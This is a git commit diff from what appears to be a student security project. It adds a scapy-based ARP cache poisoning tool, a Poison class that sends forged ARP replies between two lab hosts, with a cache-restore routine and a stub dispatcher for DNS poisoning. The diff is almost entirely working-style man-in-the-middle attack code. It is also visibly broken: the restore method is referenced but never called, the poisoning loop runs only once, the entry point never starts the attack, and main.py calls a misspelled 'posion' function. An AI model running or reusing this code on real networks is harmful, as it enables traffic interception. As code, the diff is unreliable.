71180eec75e42418120400bb2d0e12209e58172b
Manka Huszar <m.huszar@student.tue.nl>
2022-06-11 14:51:13 +0200

    arp repeat, forwarding, cache restoration

--- arp.py
+++ arp.py
@@ -1,29 +1,77 @@
+from asyncore import loop
 from scapy.all import *
 from scapy.arch import get_if_hwaddr
 from scapy.layers.l2 import Ether, ARP
 from scapy.sendrecv import sendp
+import os
+from time import sleep
 
-hosts = [["192.168.56.101", "08:00:27:b7:c4:af"], ["192.168.56.102", "08:00:27:cc:08:6f"]]
+# if silent
+# print("Forwarding intercepted packets to oiriginal destination")
+# os.system("sysctl -w net.ipv4.ip_forward=1")
+# else
+# os.system("sysctl -w net.ipv4.ip_forward=0")
+
 interface = "enp0s3"
+hosts = [["192.168.56.101", "08:00:27:b7:c4:af"],
+         ["192.168.56.102", "08:00:27:cc:08:6f"]]
+interval = 10
 
-def poison(interface, hosts):
-    macAttacker = get_if_hwaddr(interface)
 
-    def sendPoison(srcIP, dstIP, dstMAC):
-        arp = Ether() / ARP()
-        arp[Ether].src = macAttacker
-        arp[Ether].dst = dstMAC
-        arp[ARP].hwsrc = macAttacker
-        arp[ARP].psrc =  srcIP
-        arp[ARP].hwdst = dstMAC
-        arp[ARP].pdst = dstIP
+class Poison:
 
-        sendp(arp, iface = interface)
+    interface = ' '
+    hosts = ' '
+    interval = ' '
+    attackerMAC = ' '
 
-    for host1 in hosts:
-        for host2 in hosts:
-            if host1 != host2:
-                sendPoison(host1[0], host2[0], host2[1])
+    def __init__(self, interface, hosts, interval):
+        self.interface = interface
+        self.hosts = hosts
+        self.interval = interval
+        self.attackerMAC = get_if_hwaddr(self.interface)
+
+    def poison(self):
+        print("Arp poisoning selected hosts with given arguments")
+        print("Press any key to terminate the attack")
+
+        def sendPoison(srcIP, dstIP, dstMAC):
+            arp = Ether() / ARP()
+            arp[Ether].src = self.attackerMAC
+            arp[ARP].hwsrc = self.attackerMAC
+            arp[ARP].psrc = srcIP
+            arp[ARP].hwdst = dstMAC
+            arp[ARP].pdst = dstIP
+
+            sendp(arp, iface=self.interface)
+
+        try:
+            for host1 in self.hosts:
+                for host2 in self.hosts:
+                    if host1 != host2:
+                        sendPoison(host1[0], host2[0], host2[1])
+            sleep(self.interval)
+        except KeyboardInterrupt:
+            self.restore
+
+    def restore(self):
+        print("Terminating attack, restoring caches")
+
+        def sendRestore(srcIP, srcMAC, dstIP,  dstMAC):
+            arp = Ether() / ARP()
+            arp[Ether].src = self.attackerMAC
+            arp[ARP].hwsrc = srcMAC
+            arp[ARP].psrc = srcIP
+            arp[ARP].hwdst = dstMAC
+            arp[ARP].pdst = dstIP
+
+            sendp(arp, iface=self.interface)
+
+        for host1 in self.hosts:
+            for host2 in self.hosts:
+                if host1 != host2:
+                    sendRestore(host1[0], host1[1], host2[0], host2[1])
+
 
 if __name__ == '__main__':
-    poison(interface, hosts)
+    arp = Poison(interface, hosts, interval)
--- main.py
+++ main.py
@@ -2,9 +2,11 @@
 import parser
 import scan
 import validators
+import arp
 from urllib.parse import urlparse
 
 args = parser.import_args()
+
 
 def is_valid_link(x):
     try:
@@ -18,28 +20,30 @@ def is_valid_link(x):
 # if not result:
 #	print("No hosts have been scanned in this local network. Configure some and try again.")
 # else:if is_valid_link(url):
-			#print("One URL was not correct. Please check: ", url)
-			#issue = True
-			#break
+        #print("One URL was not correct. Please check: ", url)
+        #issue = True
+        # break
 #	print(result)
 
 # TODO: write those functions
 
-if args.ARP:
-	arp.posion()
-elif args.DNS:
-	websites = args.DNS
 
-	no_issue = True # check if there is an issue with one of the urls. assume there is no issue
-	for url in websites:
-		no_issue = no_issue and is_valid_link(url)
-		
-	if no_issue:
-		# HERE YOU CALL DNS POISONING FUNCTION
-		print(websites)
-	else:
-		print("Cannot begin DNS poisoning. One or more URLs were not correct.\n")
-		print("------------------------------------------------------------------\n")
-		for url in websites:
-			if not is_valid_link(url):
-				print("-", url, "is not a valid weblink. Did you append \"https://\" or \"http://\"?")
+if args.ARP:
+    arp.posion()
+elif args.DNS:
+    websites = args.DNS
+
+    no_issue = True  # check if there is an issue with one of the urls. assume there is no issue
+    for url in websites:
+        no_issue = no_issue and is_valid_link(url)
+
+    if no_issue:
+        # HERE YOU CALL DNS POISONING FUNCTION
+        print(websites)
+    else:
+        print("Cannot begin DNS poisoning. One or more URLs were not correct.\n")
+        print("------------------------------------------------------------------\n")
+        for url in websites:
+            if not is_valid_link(url):
+                print(
+                    "-", url, "is not a valid weblink. Did you append \"https://\" or \"http://\"?")
